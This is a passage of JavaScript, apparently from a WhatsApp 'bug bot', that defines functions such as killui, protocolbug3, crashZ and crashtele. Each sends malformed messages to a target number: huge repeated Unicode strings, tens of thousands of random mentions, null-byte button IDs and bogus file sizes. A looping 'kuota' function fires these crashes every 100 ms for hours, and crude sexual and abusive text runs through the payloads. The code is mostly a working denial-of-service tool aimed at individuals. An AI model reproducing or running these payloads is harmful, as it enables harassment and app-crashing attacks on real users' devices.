        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.youtube.com/@iqbhalkeifer25",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "V A M P I R E  H E R E ! ! !",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "VampClouds"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function pedoxjomokcrash(target) {
  let api = JSON.stringify({
    status: true,
    criador: "VampireAttack",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

  const messageContent = {
    messageAssociation: {
      associationType: 7,
      message: {
        textMessage: {
          text: "Bang, jual orang ga"
        }
      }
    },
    interactiveMessage: {
      header: {
        type: 1,
        title: "🩸"
      },
      body: {
        text: "Aku pedo x jomok"
      },
      footer: {
        text: "Mas rusdi"
      },
      buttons: [
        {
          name: "galaxy_message",
          buttonParamsJson: api
        },
        {
          name: "single_select",
          buttonParamsJson: api
        },
        {
          name: "cta_url",
          buttonParamsJson: api
        },
        {
          name: "cta_call",
          buttonParamsJson: api
        },
        {
          name: "payment_method",
          buttonParamsJson: api
        }
      ],
      contextInfo: {
        mentionedJid: ["13135550002@s.whatsapp.net"],
        isForwarded: true,
        forwardingScore: 999999999999,
        businessMessageForwardInfo: {
          businessOwnerJid: target
        }
      },
      quotedMessage: {
        conversation: "Pesan lama yang diedit",
        quotedMessage: {
          conversation: "Nested",
          quotedMessage: {
            conversation: "Nested again"
          }
        }
      },
      viewOnce: true
    }
  };

  const msg = await generateWAMessageFromContent(target, messageContent, { userJid: target });
  await sock.relayMessage(target, msg.message, { participant: { jid: target } });
}
async function killui(target, Ptcp = true) {
      await sock.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://files.catbox.moe/k65fvb.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "饝箔饝箔饾棩饾棶饾棿饾\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [target, "6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

// ------ ( Tama Function ) ------- \\
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                PhotoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "Photo/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "༑ ▾𝐑͜𝐄͢𝐍 🇷🇺 𝐗͜𝐎͡𝐏͢𝐎͜𝐖͡𝐍⟅̊༑ ▾",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".⟅̊༑ ▾𝐑͜𝐄͢𝐍 🇷🇺 𝐗͜𝐎͡𝐏͢𝐎͜𝐖͡𝐍⟅̊༑ ▾" + "貍賳貎🦠𝐗͜-𝐑͡𝐀͢𝐘⟅̊༑ ▾俳貍賳貎".repeat(100),
                                    title: "Finix",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}



async function kuota(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 800) {
            await Promise.all([
            protocolbug3(target, false),
            killui(target, Ptcp = true)
            ]);
            console.log(chalk.red(`Sending ( Crash🦠) ${count}/800 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

async function bulldozer1GB(target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = "image/webp";
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true",
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function crashZ(target) {
    const etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "974197419741",
                                pageCount: "974197419741",
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: "DARKNESS JIR🤡",
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173",
                                contactVcard: true,
                            },
                            hasMediaAttachment: true,
                            jpegThumbnail: "",
                        },
                        orderMessage: {
                            orderId: "CRASHCODE9471",
                            thumbnail: "",
                            itemCount: 999999999,
                            status: "INQUIRY",
                            surface: "CATALOG",
                            message: "MAMPUS KENA BUG 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘🩸" + "ꦽ".repeat(103000) + "ꦾ".repeat(70000),
                            orderTitle: "INFINITY",
                            sellerJid: "13135550002@s.whatsapp.net",
                            token: "AR5rcf+zsk2VFs9+l8RFDB34fYqsUY0nQxBMAjE66D0nFQ==",
                            totalAmount1000: "100000019492000",
                            totalCurrencyCode: "IDR",
                            messageVersion: 2,
                        },
                        contextInfo: {
                            stanzaId: sock.generateMessageTag(),
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target, "13135550002@s.whatsapp.net"],
                            quotedMessage: {
                                buttonsMessage: {
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                        fileLength: "9999999999999",
                                        pageCount: 3567587327,
                                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                        fileName: "I,M NEED PUSY",
                                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mediaKeyTimestamp: "1735456100",
                                        contactVcard: true,
                                        caption: "do you have a pussy?"
                                    },
                                    contentText: "Need Pussy",
                                    footerText: "Dimzxzzx",
                                    buttons: [
                                        {
                                            buttonId: "\u0000".repeat(900000),
                                            buttonText: {
                                                displayText: "I Need Pussy Bro"
                                            },
                                            type: 1
                                        }
                                    ],
                                    headerType: 3
                                }
                            }
                        }
                    }
                }
            }
        }),
        {
            userJid: target,
            quoted: QBug
        }
    );

    await sock.relayMessage(target, etc.message, {
        participant: { jid: target },
        messageId: etc.key.id
    });
}

async function ExTraKouta(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function aviciLoc(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            name: "avici hard",
            address: "avici",
            comment: "avici",
            accuracyInMeters: 1,
            degreesLatitude: 111.45231,
            degreesLongitude: 111.45231,
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 35000,
                  },
                  () =>
                    "628" +
                    Math.floor(Math.random() * 10000000000) +
                    "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 999999,
              isForwarded: true,
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    let statusid;
    statusid = await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });
  } catch (err) {
    console.log(err);
  }
}
async function paycrash(target) {
    await sock.relayMessage(
        target,
        {
            requestPaymentMessage: {
                currencyCodeIso4217: "XXX",
                amount1000: "9999999",
                noteMessage: {
                    extendedTextMessage: {
                        text: "# 🍷 Devorsix - How Do I Get Through This ?",
                        viewOnce: true,
                        contextInfo: {
                            businessMessageForwardInfo: {
                                businessOwnerJid: "5521992999999@s.whatsapp.net"
                            }
                        }
                    }
                },
                expiryTimestamp: "0",
                amount: {
                    value: "999999999",
                    offset: 999999999,
                    currencyCode: "XXX"
                },
                background: {
                    id: "100",
                    fileLength: "928283",
                    width: 1000,
                    height: 1000,
                    mimetype: "stay withme - devorsixcore",
                    placeholderArgb: 4278190080,
                    textArgb: 4294967295,
                    subtextArgb: 4278190080
                }
            }
        },
        {
            participant: { jid: target }
        }
    );

    //await devorsix.offerCall(bokep);
}
async function ioscrashx(target) {
   sock.relayMessage(target, {
            viewOnceMessage: {
              message: {
                orderMessage: {
                  orderId: "0",
                  itemCount: 69,
                  status: "DECLINED",
                  surface: "BUFFERS",
                  orderDescription: "⌜ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ⌟",
                  message: "⌜ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ⌟\n\n",
                  orderTitle: "⌜ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ⌟",
                  token: "92298382919191",
                  thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAD5oCZ7CkelJ4cb4AADp5uopG9C3HbQxABpS1w2gwi2QABaaSbbckE1mAAAC2gZQAH/xAAkEAACAgEDBAIDAAAAAAAAAAABAgADEQQgIRITMUEQcRQjUf/aAAgBAQABPwD5AJiaVnGY2lsAhBBwdqgExHoWVsjABDLbUqGG8y2xXJIG78Wzs94+Jp2IeXuXckmXadK6K3DctufV2PStPoTSVFmyZqKirEwsxABPAjKCgIPjZhQOYM+hFNx4BM6bGxk+Z0QHAOwjqXMRlAlVqB+f5O6vbA9hoz5OQONqsVMPHI8RShEwn7PriE7gcQjHImTMYG9Wx9Q9oYIhOT8//8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                  buttons: [],
                  messageVersion: 1
                }
              }
            }
          }, {
            participant: {
            jid: target
          }
          });
        }
  async function loadedIos(target) {
await sock.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧",
body: "hp bapuk",
previewType: "PHOTO",
thumbnail: "",
sourceUrl: "https://example.com/tama"
}
}
}, { quoted: target })
}
async function crashtele(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "misi, ini bang aswin bukan?" + "ㅤ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "- Kami Yo \"👋\"",
                    footerText: "© Caywzz",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: 'https://files.catbox.moe/k65fvb.jpg',
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! Starevxz - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: 'https://files.catbox.moe/k65fvb.jpg',
